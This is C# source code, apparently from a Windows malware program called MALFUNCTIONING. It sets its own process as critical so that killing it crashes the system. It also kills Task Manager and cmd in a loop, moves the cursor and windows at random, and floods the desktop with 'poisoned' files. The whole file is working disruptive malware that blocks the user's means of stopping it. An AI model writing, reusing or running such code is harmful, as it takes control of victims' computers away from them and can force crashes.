using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using Microsoft.VisualBasic.FileIO;
using static MALFUNCTIONING.api;
using static MALFUNCTIONING.Variables;
using static MALFUNCTIONING.Sounds;
using static MALFUNCTIONING.function;
using static MALFUNCTIONING.execute;
using static MALFUNCTIONING.payloads;
using System.Diagnostics;

namespace MALFUNCTIONING
{
    internal class Unsafe
    {
        public static void MoveCursor()
        {
            while (true)
            {
                SetCursorPos(RandX(), RandY());
                Sleep(100);
            }
        }
        public static bool SetWindowsPropertiesProc(IntPtr hwnd, IntPtr lParam)
        {
            if (IsWindowVisible(hwnd))
            {
                SetForegroundWindow(hwnd);
                RECT rc;
                GetWindowRect(hwnd, out rc);
                SetWindowPos(hwnd, IntPtr.Zero, rc.left + Randint(-10, 10), rc.top + Randint(-10, 10), rc.right - rc.left, rc.bottom - rc.top, 0x200/*SWP_NOOWNERZORDER*/);
            }
            return true;
        }
        public static void SetForegroundWindows()
        {
            while (true)
            {
                EnumWindows(SetWindowsPropertiesProc, IntPtr.Zero);
                Sleep(500);
            }
        }
        public static void DisableTask()
        {
            while (true) 
            {
                try
                {
                    foreach (var process in Process.GetProcessesByName("taskmgr"))
                    {
                        process.Kill();
                    }
                    foreach (var process in Process.GetProcessesByName("cmd"))
                    {
                        process.Kill();
                    }
                }
                catch { }
                Sleep(20);
            }
        }
        public static void MakeFiles()
        {
            for (int i = 1;i <= 100; i++)
            {
                try
                {
                    var filename = $"{_desktopPath}\\file{i}.txt";
                    using (var fs = new FileStream(filename, FileMode.Create, FileAccess.Write))
                    {
                        using (var sw = new StreamWriter(fs))
                        {
                            sw.Write("You have been poisoned by \"MALFUNCTIONING.EXE\"");
                        }
                    }
                    FileInfo fileInfo = new FileInfo(filename);
                    fileInfo.CreationTime = DateTime.MaxValue;
                    fileInfo.LastWriteTime = DateTime.MaxValue;
                    fileInfo.LastAccessTime = DateTime.MaxValue;
                    // MoveFileEx(filename, null, MOVEFILE_DELAY_UNTIL_REBOOT);
                    FileSystem.DeleteFile(filename, UIOption.AllDialogs, RecycleOption.SendToRecycleBin);
                }
                catch { }
            }
        }
        public static void RunUnsafe()
        {
            RtlAdjustPrivilege(19, true, false, out var previousValue);
            int val = 1;
            var ProcessBreakOnTermination = 0x1D;
            NtSetInformationProcess(GetCurrentProcess(), ProcessBreakOnTermination, ref val, sizeof(uint));
            NewThread(MoveCursor);
            NewThread(SetForegroundWindows);
            NewThread(DisableTask);
            NewThread(MakeFiles);
        }
    }
}
